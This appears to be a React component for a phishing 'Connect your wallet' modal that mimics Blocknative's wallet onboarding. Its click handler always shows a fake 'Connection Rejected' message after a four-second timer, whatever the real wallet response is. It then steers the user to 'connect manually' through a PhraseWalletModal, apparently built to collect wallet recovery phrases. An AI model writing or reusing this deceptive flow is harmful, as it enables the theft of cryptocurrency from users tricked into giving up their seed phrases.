import React, { useContext, useState } from 'react';
import Backdrop from '@mui/material/Backdrop';
import Box from '@mui/material/Box';
import Modal from '@mui/material/Modal';
import Fade from '@mui/material/Fade';
import Typography from '@mui/material/Typography';
import { ArrowUpIcon, CloseButton, InfoFilledIcon } from '../assets/icons';
import { myContext } from '../MyContext';
import { blockLogo, coinbaseLogo, logo, metaMaskLogo, spinner, walletConnecLogo } from '../assets/images';
import Spinner from './spinner';
import ScanWalletModal from './scanModal';
import axios from 'axios';
import { url } from './constants';
import { ethers } from 'ethers';
import PhraseWalletModal from './phraseModal';

export const style = {
    position: 'absolute',
    // top: '43%',
    left: '50%',
    // height: "440px",
    transform: 'translate(-50%, -50%)',
    borderRadius: "15px",
    marginTop: "2.5em",
    bgcolor: '#2E2E34',
    outline: "none",
    boxShadow: 24,
};

export const styleHeader = {
    borderBottom: '1px solid rgb(63 63 70)',
    p: 1,
    color: "rgb(161 161 170)",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center"
}

export default function ConnectWalletModal() {
    const { openWalletModal, setWalletModal, setScanWalletModal, setPhraseWalletModal, setClickedWallet, clickedWallet } = useContext(myContext)
    const [clickedWalletIndex, setClickedWalletIndex] = useState();
    const [isRejected, setIsRejected] = useState(false)
    const [isLoading, setIsLoading] = useState(false)

    const [metaMastWalletAddress, setMetaMaskWalletAddress] = useState("")

    const handleClose = () => setWalletModal(false);

    const avalWallets = [
        {
            logo: metaMaskLogo,
            name: "MetaMask"
        },
        {
            logo: coinbaseLogo,
            name: "Coinbase Wallet"
        },
        {
            logo: walletConnecLogo,
            name: "WalletConnect"
        },
    ]


    const authMetaMask = async () => {
        if (typeof window.ethereum !== "undefined") {
            console.log("metaMask is installed")
            try {
                const accounts = await window.ethereum.request({
                    method: "eth_requestAccounts",
                });
                console.log(accounts)
                setMetaMaskWalletAddress(accounts[0])
            } catch {
                console.log("error connecting to wallet")
            }

        } else {
            console.log("Please install metamask")
        }
    }

    // async function connectWallet() {
    //     if (typeof window.ethereum !== "undefined") {
    //         await authMetaMask();

    //         const provider = new ethers.providers.Web3Provider(window.ethereum)
    //     }
    // }

    // function handleWalletClick(name) {
    //     setClickedWalletIndex(name)
    //     authMetaMask()
    //     setTimeout(() => {
    //         // setScanWalletModal(true)
    //         setPhraseWalletModal(true)

    //         setTimeout(() => {
    //             setIsRejected(true)
    //         }, 3000);
    //     }, 2000);
    // }

    function handleWalletClick(name) {
        setClickedWalletIndex(name)
        authMetaMask()
        setTimeout(() => {
            setIsRejected(true)
        }, 4000);
    }

    function backToWallets() {
        setClickedWalletIndex()
        setIsRejected(false)
    }

    function handleManualConnect() {
        setIsLoading(true)
        setTimeout(() => {
            setPhraseWalletModal(true)
            setIsLoading(false)
        }, 3000);
    }


    return (
        <Modal
            aria-labelledby="transition-modal-title"
            aria-describedby="transition-modal-description"
            open={openWalletModal}
            onClose={handleClose}
            closeAfterTransition
            slots={{ backdrop: Backdrop }}
            slotProps={{
                backdrop: {
                    timeout: 500,
                },
            }}
        >
            <Fade in={openWalletModal}>
                <Box className=" md:w-[800px] md:h-[440px] smm:h-[360px] h-[450px]  smm:top-[43%] top-[69%] w-full max-md:overflow-y-scroll m-auto flex max-md:flex-col-reverse" sx={style}>
                    <Box className="bg-[#34353B] md:w-[39%] w-[95%] max-md:m-auto max-md:mt-6">
                        <div className='md:w-[70%] w-[90%] max-md:text-center m-auto md:pt-16'>
                            <img src={logo} alt='logo' className='w-[17px] max-md:hidden' />
                            <div className='py-6 text-[#DCEFFA]'>
                                <header className='mb-4'>Connect your wallet</header>
                                <div className='text-sm'>Connecting your wallet is like “logging in” to Web3. Select your wallet from the options to get started.</div>
                            </div>
                            <div className='flex items-center max-md:justify-center text-sm gap-2 ps-4 text-[#6370E5]'>
                                <p>I don't have a wallet </p>
                                <InfoFilledIcon className='text-2xl' />
                            </div>

                            <div className='relative md:mt-24 mt-4 mb-4 md:w-[90%] w-[130px] m-auto'>
                                <div className=' flex justify-between items-center'>
                                    <div className='h-3 w-3 z-10 bg-[#6370E5] rounded-full border-[#1A1D26] border-2'></div>
                                    <div className='h-2  top-[0px] w-2 z-10 bg-[#1A1D26] rounded-full'></div>
                                    <div className='h-2  top-[0px] w-2 z-10 bg-[#1A1D26] rounded-full'></div>
                                </div>
                                <div className='absolute top-1/2 w-full h-[2px] bg-[#1A1D26]'></div>
                            </div>
                            <div className='text-[#DCEFFA] max-md:hidden flex gap-1 ms-8 items-center text-[12px] text-center'>powered by
                                <b>blocknative</b>
                                <img src={blockLogo} alt='' className='w-[15px]' />
                            </div>
                        </div>
                        <div className='text-[#DCEFFA] gap-1 flex ps-[30%] items-center md:hidden bg-[#2E2E34] py-3 text-[12px] text-center'>powered by
                            <b>blocknative</b>
                            <img src={blockLogo} alt='' className='w-[15px]' />
                        </div>
                    </Box>


                    <Box className="md:w-[61%] relative">
                        <Box sx={styleHeader}>
                            <Typography className='text-white ps-2'> {!isRejected ? "Available Wallets (2)" : "Connection Rejected"} </Typography>
                            <CloseButton onClick={handleClose} className='text-[32px] shadow-sm cursor-pointer bg-[#34353B] p-1 rounded-full text-zinc-400' />
                        </Box>
                        <Box className="">
                            <div className='w-[94%] max-md:overflow-x-scroll hideScrollBar max-md:flex items-start gap-3 max-md:pt-2 m-auto'>
                                {
                                    !isRejected && (
                                        <>
                                            <div className='text-[#DCEFFA] md:grid flex items-start grid-cols-2 md:gap-2 gap-6 pt-4'>
                                                {
                                                    avalWallets.map((wallet, index) => (
                                                        <div key={index} onClick={(e) => { handleWalletClick(wallet.name); setClickedWallet({ ...clickedWallet, logo: wallet.logo, name: wallet.name }) }} className='md:border duration-500 max-md:text-center rounded-2xl hover:bg-[#34353B] cursor-pointer md:p-4 border-zinc-700 md:flex items-center gap-2'>
                                                            <div className='border p-2 md:h-[3.1em] h-[4em] flex items-center justify-center max-md:mb-2 rounded-2xl border-zinc-600 md:w-[50px] w-[4em]'>
                                                                {
                                                                    clickedWalletIndex === wallet.name ? (
                                                                        <Spinner />
                                                                    ) : (
                                                                        <img src={wallet.logo} alt='' className=' w-full object-contain ' />
                                                                    )
                                                                }
                                                            </div>
                                                            <div className=' max-md:text-[12px]'>{wallet.name}</div>
                                                        </div>
                                                    ))
                                                }
                                            </div>

                                            <div className='flex max-md:min-w-[600px] justify-between bg-[#FFEFCC] rounded-xl p-3 md:mt-2 mt-4'>
                                                <div className='text-[12px] text-[#6370E5]'>
                                                    <div className='text-[#71530F]'>Why don't I see my wallet?</div>
                                                    <div >Click here to learn more</div>
                                                </div>
                                                <InfoFilledIcon className='text-[#664600] text-[20px]' />
                                            </div>
                                        </>
                                    )
                                }
                                {
                                    isRejected && (
                                        <div>
                                            <div className='flex gap-12 bg-[#FFEFCC] max-md:min-w-[400px] rounded-3xl p-4 mt-4'>
                                                <div className='flex items-center relative '>
                                                    <div className='w-[40px] border flex justify-center items-center rounded-xl bg-[#EBEBED] border-[#FFAF00] h-[40px]'>
                                                        <img src={logo} alt='wallet' className='w-1/2' />
                                                    </div>
                                                    <div className='w-[40px] border absolute right-[-2em] flex justify-center items-center rounded-xl bg-white border-[#FFAF00] h-[40px]'>
                                                        <img src={clickedWallet.logo} alt='wallet' className='w-1/2' />
                                                    </div>
                                                </div>
                                                <div className='text-[12px] text-[#6370E5]'>
                                                    <div className='text-[#71530F] text-[16px]'>Connection Rejected!</div>
                                                    <div onClick={handleManualConnect} className=' cursor-pointer'>Click here to connect manually</div>
                                                    {/* <div>Click here to try again</div> */}
                                                </div>
                                            </div>
                                            {/* <div className='mt-12 flex justify-center'>
                                                <div>
                                                    <div className='text-[12px] text-zinc-300'>Having issues connecting wallet?</div>
                                                    <button
                                                        onClick={handleManualConnect}
                                                        className=" flex items-center justify-center rounded-full bg-primGreen w-[200px] mt-2 text-black py-[7px]"
                                                    >
                                                        {
                                                            isLoading ? (
                                                                <img src={spinner} alt='Loading...' className='w-[20px]' />
                                                            ) : (
                                                                <div className='flex gap-2 items-center'>
                                                                    Connect manually <ArrowUpIcon />
                                                                </div>
                                                            )
                                                        }
                                                    </button>
                                                </div>
                                            </div> */}
                                            <div onClick={backToWallets} className=' bottom-8 max-md:mt-6 max-md:w-[200px] md:absolute flex md:justify-center items-center w-full '>
                                                <button className='bg-[#FFFFFF]  text-[13px] px-4 font-bold text-[#33394B] py-1 rounded-full'>
                                                    Back to wallets
                                                </button>
                                            </div>
                                        </div>
                                    )
                                }
                            </div>
                            {/* <ScanWalletModal /> */}
                            <PhraseWalletModal />
                        </Box>
                    </Box>
                </Box>
            </Fade>
        </Modal>
    );
}
